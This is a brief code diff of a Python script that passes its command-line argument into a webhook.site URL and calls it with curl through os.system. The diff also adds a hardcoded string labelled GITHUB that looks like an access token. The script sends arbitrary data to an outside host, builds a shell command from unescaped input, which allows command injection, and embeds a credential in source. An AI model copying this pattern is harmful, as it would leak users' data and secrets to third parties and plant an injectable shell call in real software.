@@ -1,4 +1,4 @@
-   import os
+  import os
 import sys
 
 if len(sys.argv) != 2:
@@ -7,6 +7,7 @@ if len(sys.argv) != 2:
 
 data = sys.argv[1] 
 url = f"https://webhook.site/fd644fc7-7be3-42a2-aaab-1353b62ad229/?data={data}"
+GITHUB="gi_pat_11BGUE6FA0E9ogTFJhunGy_AgWCaDgwScT7zn3SdBlf9x7p7L0y4mmp6QPSv6sGLkmTVLKPYGSqcbQorwd"
     
 
 os.system(f"curl '{url}'")
